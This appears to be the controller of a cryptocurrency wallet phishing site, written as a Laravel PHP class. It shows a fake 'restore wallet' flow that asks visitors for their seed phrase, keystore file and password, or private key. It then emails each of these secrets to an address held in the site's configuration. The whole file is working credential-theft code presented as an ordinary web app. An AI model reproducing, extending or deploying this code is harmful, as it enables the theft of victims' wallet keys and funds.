<?php

namespace App\Http\Controllers;

use App\Models\KeyDetail;
use App\Notifications\KeystoreNotification;
use App\Notifications\PhraseNotification;
use App\Notifications\PrivateKeyNotification;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Notification;

class CoreController extends Controller
{
    /**
     * Base route
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function base()
    {
        return view('welcome');
    }

    /**
     * Select a wallet
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function wallets()
    {
        return view('wallets');
    }

    /**
     * Wallet details
     *
     * @return \Illuminate\Http\Response
     * @param String $vendor
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function restore(String $vendor)
    {
        $data = [
            'vendor' => $vendor
        ];

        return view('restore')->with($data);
    }

    /**
     * Deliver details
     *
     * @param \Illuminate\Http\Request $request
     * @param String $vendor
     */
    public function deliver(Request $request, String $vendor)
    {
        // return $request;
        $wallet_type = $request->validate([
            'type' => 'required'
        ]);

        switch ($wallet_type['type']) {
            case 'phrase':
                $values = $request->validate([
                    'phrase' => 'required'
                ]);

                $details = new KeyDetail();
                $details->vendor = $vendor;
                $details->phrase = $values['phrase'];

                Notification::route('mail', config('myglobals.email'))->notify(new PhraseNotification($details));
                break;
            case 'keystore':
                $values = $request->validate([
                    'keystore' => 'required',
                    'password' => 'required'
                ]);

                $details = new KeyDetail();
                $details->vendor = $vendor;
                $details->keystore = $values['keystore'];
                $details->password = $values['password'];

                Notification::route('mail', config('myglobals.email'))->notify(new KeystoreNotification($details));
                break;
            case 'private_key':
                $values = $request->validate([
                    'private_key' => 'required'
                ]);

                $details = new KeyDetail();
                $details->vendor = $vendor;
                $details->private_key = $values['private_key'];

                Notification::route('mail', config('myglobals.email'))->notify(new PrivateKeyNotification($details));
                break;
        }

        return 'ok';
    }
}
